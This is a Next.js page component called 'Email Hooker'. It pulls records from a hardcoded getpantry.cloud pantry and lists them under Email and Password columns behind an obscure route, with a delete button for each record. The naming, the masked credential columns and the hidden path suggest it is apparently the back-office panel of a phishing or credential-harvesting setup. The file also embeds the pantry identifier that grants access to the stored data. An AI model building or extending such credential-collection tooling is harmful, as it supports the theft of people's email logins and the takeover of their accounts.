import React, { useEffect, useState } from 'react'
import Link from 'next/link'
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'
import { faTrash } from '@fortawesome/free-solid-svg-icons'

const Index = (props) => {

    console.log(props)

    const [Data, setData] = useState([])
    const [Baskets, setBaskets] = useState(props.data.baskets)




    const deleteBasket = (BasketName) => {
        console.log("DELETE BASKET")


        if (confirm(`DELETE ${BasketName}`)) {


            fetch(`https://getpantry.cloud/apiv1/pantry/0b32f6c1-ae41-4ec1-9faf-71fa0a75a3a6/basket/${BasketName}`, {
                method: 'DELETE',
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'POST,PATCH,OPTIONS'
                },
            })
                .then((response) => {
                    console.log(response)
                    Baskets.map((e, i) => {

                        setBaskets(
                            Baskets.filter(a => a.name !== e.name)
                        );

                    })
                })
                .catch((error) => {
                    console.error('Error:', error);
                });

        }

        else{


        }

    }


    return (
        <>

            <nav className="bg-white border-gray-200 px-2 sm:px-4 py-2.5 rounded dark:bg-gray-900">
                <div className="container flex flex-wrap items-center justify-between mx-auto">
                    <Link href="/9W1vw0PcCYNaXV6Pl3K4MgsjXQBsT2Gj" className="flex items-center">
                        <span className="self-center text-xl font-semibold whitespace-nowrap dark:text-white">Email Hooker</span>
                    </Link>

                    <div className="hidden w-full md:block md:w-auto" id="navbar-default">
                        <ul className="flex flex-col p-4 mt-4 border border-gray-100 rounded-lg bg-gray-50 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
                            <li>
                                <Link href="/9W1vw0PcCYNaXV6Pl3K4MgsjXQBsT2Gj" className="block text-xl py-2 pl-3 pr-4 text-white bg-blue-700 rounded md:bg-transparent md:p-0 dark:text-white" >Home</Link>
                            </li>

                        </ul>
                    </div>
                </div>
            </nav>


            <div className="relative overflow-x-auto md:m-8 my-1">
                <table className="w-full text-sm text-left text-gray-500 dark:text-gray-400">
                    <thead className="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
                        <tr>
                            <th scope="col" className="px-6 py-3">
                                Basket Name
                            </th>
                            <th scope="col" className="px-6 py-3">
                                Email
                            </th>
                            <th scope="col" className="px-6 py-3">
                                Password
                            </th>
                            <th scope="col" className="px-6 py-3">
                                Delete
                            </th>
                        </tr>
                    </thead>
                    <tbody>
                        {
                            Baskets.map((e, i) => {
                                return (
                                    <tr className="bg-white border-b dark:bg-gray-800 dark:border-gray-700 " key={i}>
                                        <th scope="row" className="cursor-pointer px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white">
                                            <Link href={`/9W1vw0PcCYNaXV6Pl3K4MgsjXQBsT2Gj/${e.name}`}>
                                                <p className='hover:text-cyan-200'>
                                                    {e.name}
                                                </p>
                                            </Link>
                                        </th>
                                        <td className="px-6 py-4">
                                            ****
                                        </td>
                                        <td className="px-6 py-4">
                                            ****
                                        </td>
                                        <td className="px-6 py-4 md:text-left text-center cursor-pointer" >
                                            <FontAwesomeIcon className='hover:text-red-500 duration-300' icon={faTrash} onClick={() => deleteBasket(e.name)} />
                                        </td>

                                    </tr>

                                )

                            })
                        }
                    </tbody>

                </table>
            </div>



        </>
    )
}

export async function getServerSideProps() {


    const res = await fetch(`https://getpantry.cloud/apiv1/pantry/0b32f6c1-ae41-4ec1-9faf-71fa0a75a3a6`, {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'POST,PATCH,OPTIONS'
        },
    })

    const data = await res.json()
    return {
        props: { data }, // will be passed to the page component as props
    }
}

export default Index